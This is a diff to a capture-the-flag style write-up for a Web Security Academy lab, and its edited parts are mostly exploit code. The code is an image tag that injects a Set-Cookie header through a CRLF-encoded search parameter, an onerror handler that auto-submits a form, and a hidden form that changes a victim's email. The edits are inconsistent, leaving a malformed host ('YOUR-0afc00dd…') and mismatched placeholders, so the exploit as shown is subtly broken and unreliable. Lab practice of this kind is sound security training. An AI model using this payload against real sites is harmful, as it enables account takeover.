@@ -49,7 +49,7 @@ Cross-Site Request Forgery (CSRF) / Cookie Injection
 15. Remove the auto-submit script and add the following image tag before the form submission to inject the attacker's **csrfKey** cookie:
 
 ```html
-<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+<img src="https://0afc00dd03b3c6f280800dc900920009.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 
 16. Modify the email address in the exploit to an attacker-controlled email address.
@@ -63,7 +63,7 @@ Cross-Site Request Forgery (CSRF) / Cookie Injection
 ### Cookie Injection URL
 
 ```text
-/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None
+/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRF_KEY%3b%20SameSite=None
 ```
 
 ### Exploit
@@ -72,12 +72,12 @@ Cross-Site Request Forgery (CSRF) / Cookie Injection
 <html>
   <body>
 
-    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None"
+    <img src="https://YOUR-0afc00dd03b3c6f280800dc900920009.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None"
          onerror="document.forms[0].submit()">
 
     <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="attacker@example.com">
-      <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
+      <input type="hidden" name="email" value="xyz@example.com">
+      <input type="hidden" name="csrf" value="CSRF_TOKEN">
     </form>
 
   </body>
